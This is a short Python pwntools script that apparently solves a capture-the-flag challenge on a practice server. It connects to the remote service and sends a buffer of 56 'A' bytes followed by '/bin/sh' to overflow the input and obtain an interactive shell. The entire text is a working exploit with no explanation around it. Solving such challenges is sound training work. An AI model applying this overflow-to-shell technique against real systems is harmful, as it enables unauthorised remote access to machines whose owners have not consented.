from pwn import *

host='ctf.hackucf.org'
port=7003

c = remote(host=host, port=port)

c.sendline(b'A' * 56 + b'/bin/sh')

c.interactive()